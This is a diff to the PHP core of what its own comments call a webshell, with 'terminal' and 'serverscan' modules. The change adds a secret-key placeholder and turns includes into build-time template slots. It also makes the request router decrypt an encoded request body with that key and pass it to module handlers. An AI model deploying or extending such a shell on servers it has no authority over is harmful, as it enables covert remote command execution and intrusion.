@@ -25,6 +25,7 @@ class BaseModule
 {
     protected static $_instance = null;
     protected $_data = null;
+    protected $_body = null;
 
     protected function __construct() {
     }
@@ -50,7 +51,28 @@ class BaseModule
 
         fail();
     }
+
+    public function setBody($body) {
+        $this->_body = $body;
+    }
+
+    protected function body() {
+        return $this->_body;
+    }
 }
+
+
+/**
+ * ==========================================================================
+ *  Secret
+ *
+ *  This secret key must NEVER be shared with someone else.
+ *  It's your way of authenticating to this webshell and protect the server
+ *      from unauthorized access and arbitrary code execution.
+ * ==========================================================================
+ */
+
+//{SECRETKEY}
 
 
 /**
@@ -59,12 +81,8 @@ class BaseModule
  * ==========================================================================
  */
 
-$MODULES = ['core', 'terminal', 'serverscan'];
-
+//{MODULELIST}
 //{MODULES}
-
-// TEMPORARY :
-require 'core.module.php';
 
 
 /**
@@ -73,7 +91,7 @@ require 'core.module.php';
  * ==========================================================================
  */
 
-require_once 'functions.php';
+//{FUNCTIONS}
 
 
 /**
@@ -165,6 +183,7 @@ function authenticate() {
  */
 
 function route($module, $handler, $data=array()) {
+    global $SECRET_KEY;
     $className = ucfirst(strtolower($module)).'Module';
     $methodName = 'api_'.$handler;
 
@@ -173,6 +192,17 @@ function route($module, $handler, $data=array()) {
 
         if (method_exists($mod, $methodName)) {
             $mod->setData($data);
+
+            // Check body
+            $body = @file_get_contents('php://input');
+            if (preg_match('#^[a-z0-9+/=]+$#i', $body)) {
+                $body = strdecrypt($body, $SECRET_KEY);
+                if (!is_null($body)) {
+                    $mod->setBody($body);
+                }
+            }
+
+            // Call module handler
             echo call_user_func(array($mod, $methodName));
             exit;
         }
